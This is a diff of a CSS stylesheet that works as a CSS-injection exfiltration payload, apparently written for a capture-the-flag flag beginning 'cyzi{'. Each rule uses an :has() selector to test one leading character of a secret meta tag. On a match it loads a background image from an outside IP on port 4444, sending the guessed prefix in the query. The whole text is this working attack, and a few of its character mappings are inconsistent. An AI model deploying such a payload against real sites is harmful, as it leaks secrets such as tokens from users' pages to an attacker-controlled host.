@@ -9,21 +9,21 @@
 }
 
 html:has(meta[name=secret][content^=a]) {
-    background-image: url(http://167.99.47.105:4444?char=a);
+    background-image: url(http://167.99.47.105:4444?secret=cyzi%7Ba);
 }
 
 html:has(meta[name=secret][content^=b]) {
-    background-image: url(http://167.99.47.105:4444?char=b);
+    background-image: url(http://167.99.47.105:4444?secret=cyzi%7Bb);
 }
 
 html:has(meta[name=secret][content^=c]) {
-    background-image: url(http://167.99.47.105:4444?char=c);
+    background-image: url(http://167.99.47.105:4444?secret=cyzi%7Bc);
 }
 
 html:has(meta[name=secret][content^=d]) {
-    background-image: url(http://167.99.47.105:4444?char=d);
+    background-image: url(http://167.99.47.105:4444?secret=cyzi%7Bw);
 }
 
 html:has(meta[name=secret][content^=n]) {
-    background-image: url(http://167.99.47.105:4444?char=n);
+    background-image: url(http://167.99.47.105:4444?secret=cyzi%7Bx);
 }
